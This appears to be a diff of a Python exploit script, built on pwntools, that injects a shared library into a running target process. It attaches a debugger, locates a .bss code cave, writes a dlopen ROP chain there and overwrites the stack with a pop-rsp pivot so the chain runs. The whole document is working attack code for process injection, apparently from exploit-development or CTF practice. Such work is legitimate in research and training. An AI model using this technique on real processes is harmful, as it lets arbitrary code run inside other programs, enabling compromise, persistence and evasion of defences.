@@ -1,12 +1,10 @@
 #!/usr/bin/env python3
 import argparse
-from memutils import *
-
-LIBC_PATH = "/usr/lib/x86_64-linux-gnu/libc.so.6"
-PAGE_SIZE = 4096
+from exploitutils import *
 
 context.arch = 'amd64'
 context.terminal = ['tmux', 'splitw', '-h']
+
 
 def parse_args():
     parser = argparse.ArgumentParser(description="[*] process injection on a vulnerable binary.")
@@ -18,16 +16,26 @@ def parse_args():
 def inject(user_args):
     target_process = process([user_args.binary])
     gdb.attach(target_process.pid, """source /home/ninpwn/tools/debuggers/pwndbg/gdbinit.py""")
-    syscall_info = parse_proc_syscall(pid=target_process.pid)
+
+    exploit_utils = ExploitUtils(target_process.pid)
+    syscall_info = exploit_utils.parse_proc_syscall()
     log.info(f"current rsp: {hex(syscall_info.rsp)}")
-    maps = parse_maps(pid=target_process.pid)
-    rop_chain = dl_open_rop(pid=target_process.pid, address=syscall_info.rsp, so_path=user_args.so, maps=maps)
-    write_memory(pid=target_process.pid, address=syscall_info.rsp, content=rop_chain)
+
+    bss_cave = exploit_utils.find_cave(cave_size=0x100)
+    dlopen_rop_chain = exploit_utils.dl_open_rop(address=bss_cave, so_path=user_args.so)
+    exploit_utils.write_memory(address=bss_cave, content=dlopen_rop_chain)
+
+    pop_rsp_gadget = exploit_utils.find_gadget(gadget=asm("pop rsp; ret"), gadget_name="pop_rsp")
+    pop_rbp_gadget = exploit_utils.find_gadget(gadget=asm("pop rbp; ret"), gadget_name="pop_rbp")
+    exploit_utils.write_memory(address=syscall_info.rsp, content=p64(pop_rsp_gadget) + p64(bss_cave))
+
     target_process.interactive()
+
 
 def main():
     user_args = parse_args()
     inject(user_args)
+
 
 if __name__ == "__main__":
     main()
